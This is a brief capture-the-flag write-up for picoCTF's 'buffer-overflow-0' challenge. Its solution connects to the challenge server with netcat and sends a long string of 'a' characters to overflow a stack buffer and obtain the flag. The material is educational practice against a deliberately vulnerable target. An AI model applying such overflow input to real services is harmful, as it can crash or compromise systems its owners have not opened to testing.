# buffer-overflow-0

### Description

Smash the stack Let's start off simple, can you overflow the correct buffer?

### Resources

- nc saturn.picoctf.net 65445
- vuln.c

### Solution

Step 1: Connect to endpoint

Step 2: Enter a string of a's that is long enough to overflow the buffer

```console
sam@ubuntu:~$ nc saturn.picoctf.net 65445
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Flagtime :tada: